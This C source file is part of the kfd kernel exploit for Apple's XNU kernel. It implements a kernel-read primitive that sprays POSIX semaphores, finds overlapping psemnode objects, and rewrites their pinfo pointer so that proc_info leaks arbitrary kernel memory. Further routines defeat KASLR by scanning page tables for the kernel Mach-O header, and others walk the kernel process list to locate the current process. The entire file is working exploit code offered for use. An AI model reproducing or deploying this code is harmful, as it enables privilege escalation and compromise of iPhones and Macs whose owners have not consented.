/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#include "kread_sem_open.h"
#include <os/log.h>

const char* kread_sem_open_name = "kfd-posix-semaphore";

void kread_sem_open_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kread.krkw_object_size = sizeof(struct psemnode);

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id + 1) * (sizeof(int32_t))) + sizeof(struct psem_fdinfo);
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);

    // Use raw syscall to bypass C library wrapper which returns mmap'd sem_t*
    // (pointer truncation to int32 loses high bits on arm64, giving sem_fd=0)
    // Raw SYS_sem_open returns the kernel psem file descriptor directly.
    syscall(SYS_sem_unlink, kread_sem_open_name);
    errno = 0; // Clear stale errno from sem_unlink before checking sem_open result
    int32_t sem_fd = (int32_t)syscall(SYS_sem_open, kread_sem_open_name, (O_CREAT | O_EXCL), (S_IRUSR | S_IWUSR), 0);
    if (sem_fd < 0) {
        print_failure("sem_open failed: sem_fd=%d, errno=%d (%s)", sem_fd, errno, strerror(errno));
    }
    kfd_assert(sem_fd >= 0);

    int32_t* fds = (int32_t*)(kfd->kread.krkw_method_data);
    fds[kfd->kread.krkw_maximum_id] = sem_fd;

    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    int32_t callnum = PROC_INFO_CALL_PIDFDINFO;
    int32_t pid = kfd->info.env.pid;
    uint32_t flavor = PROC_PIDFDPSEMINFO;
    uint64_t arg = sem_fd;
    uint64_t buffer = (uint64_t)(sem_data);
    int32_t buffersize = (int32_t)(sizeof(struct psem_fdinfo));
    kfd_assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
}

void kread_sem_open_allocate(struct kfd* kfd, uint64_t id)
{
    // Use raw syscall - same reason as kread_sem_open_init
    errno = 0;
    int32_t fd = (int32_t)syscall(SYS_sem_open, kread_sem_open_name, 0, 0, 0);
    if (fd < 0) {
        print_failure("sem_open (allocate) failed: fd=%d, errno=%d (%s)", fd, errno, strerror(errno));
    }
    kfd_assert(fd >= 0);

    int32_t* fds = (int32_t*)(kfd->kread.krkw_method_data);
    fds[id] = fd;
}

bool kread_sem_open_search(struct kfd* kfd, uint64_t object_uaddr)
{
    volatile struct psemnode* pnode = (volatile struct psemnode*)(object_uaddr);
    int32_t* fds = (int32_t*)(kfd->kread.krkw_method_data);
    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);

    if ((pnode[0].pinfo > pac_mask) &&
        (pnode[1].pinfo == pnode[0].pinfo) &&
        (pnode[2].pinfo == pnode[0].pinfo) &&
        (pnode[3].pinfo == pnode[0].pinfo) &&
        (pnode[0].padding == 0) &&
        (pnode[1].padding == 0) &&
        (pnode[2].padding == 0) &&
        (pnode[3].padding == 0)) {
        for (uint64_t object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
            struct psem_fdinfo data = {};
            int32_t callnum = PROC_INFO_CALL_PIDFDINFO;
            int32_t pid = kfd->info.env.pid;
            uint32_t flavor = PROC_PIDFDPSEMINFO;
            uint64_t arg = fds[object_id];
            uint64_t buffer = (uint64_t)(&data);
            int32_t buffersize = (int32_t)(sizeof(struct psem_fdinfo));

            const uint64_t shift_amount = 4;
            pnode[0].pinfo += shift_amount;
            kfd_assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
            pnode[0].pinfo -= shift_amount;

            if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                kfd->kread.krkw_object_id = object_id;
                return true;
            }
        }

        /*
         * False alarm: it wasn't one of our psemmode objects.
         */
        print_warning("failed to find modified psem_name sentinel");
    }

    return false;
}

void kread_sem_open_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
{
    volatile uint64_t* type_base = (volatile uint64_t*)(uaddr);
    uint64_t type_size = ((size) / (sizeof(uint64_t)));
    for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {
        uint64_t type_value = kread_sem_open_kread_u64(kfd, kaddr + (type_offset * sizeof(uint64_t)));
        type_base[type_offset] = type_value;
    }
}

//thanks to @wh1te4ever!
void kread_sem_open_kaslr(struct kfd* kfd, uint64_t task_kaddr)
{
    uint64_t kerntask_vm_map = 0;
    kread_sem_open_kread(kfd, task_kaddr + 0x28, &kerntask_vm_map, sizeof(kerntask_vm_map));
    kerntask_vm_map = kerntask_vm_map | 0xffffff8000000000;
    os_log_error(OS_LOG_DEFAULT, "[kfd-kaslr] vm_map=0x%llx", kerntask_vm_map);

    uint64_t kerntask_pmap = 0;
    kread_sem_open_kread(kfd, kerntask_vm_map + 0x40, &kerntask_pmap, sizeof(kerntask_pmap));
    kerntask_pmap = kerntask_pmap | 0xffffff8000000000;
    os_log_error(OS_LOG_DEFAULT, "[kfd-kaslr] pmap=0x%llx", kerntask_pmap);

    /* Pointer to the root translation table. */ /* translation table entry */
    uint64_t kerntask_tte = 0;
    kread_sem_open_kread(kfd, kerntask_pmap, &kerntask_tte, sizeof(kerntask_tte));
    kerntask_tte = kerntask_tte | 0xffffff8000000000;
    os_log_error(OS_LOG_DEFAULT, "[kfd-kaslr] tte=0x%llx", kerntask_tte);

    uint64_t kerntask_tte_page = kerntask_tte & ~(0xfff);
    os_log_error(OS_LOG_DEFAULT, "[kfd-kaslr] tte_page=0x%llx, starting search...", kerntask_tte_page);

    uint64_t kbase = 0;
    uint64_t search_count = 0;
    const uint64_t max_search = 0x10000; // 256MB max search range
    while (true) {
        uint64_t val = 0;
        kread_sem_open_kread(kfd, kerntask_tte_page, &val, sizeof(val));
        if (search_count < 5 || (search_count % 1000 == 0)) {
            os_log_error(OS_LOG_DEFAULT, "[kfd-kaslr] search #%llu: page=0x%llx val=0x%llx",
                   search_count, kerntask_tte_page, val);
        }
        if(val == 0x100000cfeedfacf) {
            kread_sem_open_kread(kfd, kerntask_tte_page + 0x18, &val, sizeof(val)); //check if mach_header_64->flags, mach_header_64->reserved are all 0
            if(val == 0) {
                kbase = kerntask_tte_page;
                os_log_error(OS_LOG_DEFAULT, "[kfd-kaslr] FOUND kernel base at 0x%llx after %llu pages", kbase, search_count);
                break;
            }
        }
        kerntask_tte_page -= 0x1000;
        search_count++;
        if (search_count >= max_search) {
            os_log_error(OS_LOG_DEFAULT, "[kfd-kaslr] ABORT: searched %llu pages without finding kernel base", search_count);
            kfd->info.kernel.kernel_slide = 0;
            return;
        }
    }
    kfd->info.kernel.kernel_slide = kbase - 0xFFFFFFF007004000;
    os_log_error(OS_LOG_DEFAULT, "[kfd-kaslr] kernel_slide=0x%llx", kfd->info.kernel.kernel_slide);
}

void kread_sem_open_find_proc(struct kfd* kfd)
{
    os_log_error(OS_LOG_DEFAULT, "[kfd-kread] find_proc: ENTER, object_uaddr=0x%llx, object_id=%llu",
           kfd->kread.krkw_object_uaddr, kfd->kread.krkw_object_id);

    uint64_t pseminfo_kaddr = static_uget(psemnode, pinfo, kfd->kread.krkw_object_uaddr);
    os_log_error(OS_LOG_DEFAULT, "[kfd-kread] find_proc: pseminfo_kaddr=0x%llx", pseminfo_kaddr);

    uint64_t semaphore_kaddr = static_kget(pseminfo, uint64_t, psem_semobject, pseminfo_kaddr);
    os_log_error(OS_LOG_DEFAULT, "[kfd-kread] find_proc: semaphore_kaddr=0x%llx", semaphore_kaddr);

    uint64_t task_kaddr = static_kget(semaphore, uint64_t, owner, semaphore_kaddr);
    os_log_error(OS_LOG_DEFAULT, "[kfd-kread] find_proc: task_kaddr=0x%llx", task_kaddr);

    uint64_t proc_kaddr = task_kaddr - dynamic_sizeof(proc);
    kfd->info.kernel.kernel_proc = proc_kaddr;
    os_log_error(OS_LOG_DEFAULT, "[kfd-kread] find_proc: proc_kaddr=0x%llx (kernel_proc)", proc_kaddr);
    
    if(isarm64e()) {
        os_log_error(OS_LOG_DEFAULT, "[kfd-kread] find_proc: starting kaslr...");
        kread_sem_open_kaslr(kfd, task_kaddr);
        os_log_error(OS_LOG_DEFAULT, "[kfd-kread] find_proc: kaslr done, slide=0x%llx", kfd->info.kernel.kernel_slide);
        print_x64(kfd->info.kernel.kernel_slide);
        // NOTE: patchfinder deferred to kopen() after krkw_run completes.
        // Running it here causes millions of sem_open kread calls during
        // the kread allocate phase, creating a huge race window that
        // frequently triggers kernel panics.
    }

    /*
     * Go backwards from the kernel_proc, which is the last proc in the list.
     */
    os_log_error(OS_LOG_DEFAULT, "[kfd-kread] find_proc: walking proc list from 0x%llx, looking for pid=%d",
           proc_kaddr, kfd->info.env.pid);
    while (true) {
        int32_t pid = dynamic_kget(proc, p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kernel.current_proc = proc_kaddr;
            break;
        }

        proc_kaddr = dynamic_kget(proc, p_list_le_prev, proc_kaddr);
    }
}

void kread_sem_open_deallocate(struct kfd* kfd, uint64_t id)
{
    /*
     * Let kwrite_sem_open_deallocate() take care of
     * deallocating all the shared file descriptors.
     */
    return;
}

void kread_sem_open_free(struct kfd* kfd)
{
    /*
     * Let's null out the kread reference to the shared data buffer
     * because kwrite_sem_open_free() needs it and will free it.
     */
    kfd->kread.krkw_method_data = NULL;
}

/*
 * 64-bit kread function.
 */

uint64_t kread_sem_open_kread_u64(struct kfd* kfd, uint64_t kaddr)
{
    static uint64_t kread_count = 0;
    kread_count++;

    int32_t* fds = (int32_t*)(kfd->kread.krkw_method_data);
    int32_t kread_fd = fds[kfd->kread.krkw_object_id];
    uint64_t psemnode_uaddr = kfd->kread.krkw_object_uaddr;

    uint64_t old_pinfo = static_uget(psemnode, pinfo, psemnode_uaddr);
    uint64_t new_pinfo = kaddr - static_offsetof(pseminfo, psem_uid);

    if (kread_count <= 5) {
        os_log_error(OS_LOG_DEFAULT, "[kfd-kread] kread_u64 #%llu: kaddr=0x%llx old_pinfo=0x%llx new_pinfo=0x%llx fd=%d",
               kread_count, kaddr, old_pinfo, new_pinfo, kread_fd);
    }

    static_uset(psemnode, pinfo, psemnode_uaddr, new_pinfo);

    struct psem_fdinfo data = {};
    int32_t callnum = PROC_INFO_CALL_PIDFDINFO;
    int32_t pid = kfd->info.env.pid;
    uint32_t flavor = PROC_PIDFDPSEMINFO;
    uint64_t arg = kread_fd;
    uint64_t buffer = (uint64_t)(&data);
    int32_t buffersize = (int32_t)(sizeof(struct psem_fdinfo));
    kfd_assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    static_uset(psemnode, pinfo, psemnode_uaddr, old_pinfo);
    return *(uint64_t*)(&data.pseminfo.psem_stat.vst_uid);
}

/*
 * 32-bit kread function that is guaranteed to not underflow a page,
 * i.e. those 4 bytes are the first 4 bytes read by the modified kernel pointer.
 */

uint32_t kread_sem_open_kread_u32(struct kfd* kfd, uint64_t kaddr)
{
    int32_t* fds = (int32_t*)(kfd->kread.krkw_method_data);
    int32_t kread_fd = fds[kfd->kread.krkw_object_id];
    uint64_t psemnode_uaddr = kfd->kread.krkw_object_uaddr;

    uint64_t old_pinfo = static_uget(psemnode, pinfo, psemnode_uaddr);
    uint64_t new_pinfo = kaddr - static_offsetof(pseminfo, psem_usecount);
    static_uset(psemnode, pinfo, psemnode_uaddr, new_pinfo);

    struct psem_fdinfo data = {};
    int32_t callnum = PROC_INFO_CALL_PIDFDINFO;
    int32_t pid = kfd->info.env.pid;
    uint32_t flavor = PROC_PIDFDPSEMINFO;
    uint64_t arg = kread_fd;
    uint64_t buffer = (uint64_t)(&data);
    int32_t buffersize = (int32_t)(sizeof(struct psem_fdinfo));
    kfd_assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    static_uset(psemnode, pinfo, psemnode_uaddr, old_pinfo);
    return *(uint32_t*)(&data.pseminfo.psem_stat.vst_size);
}
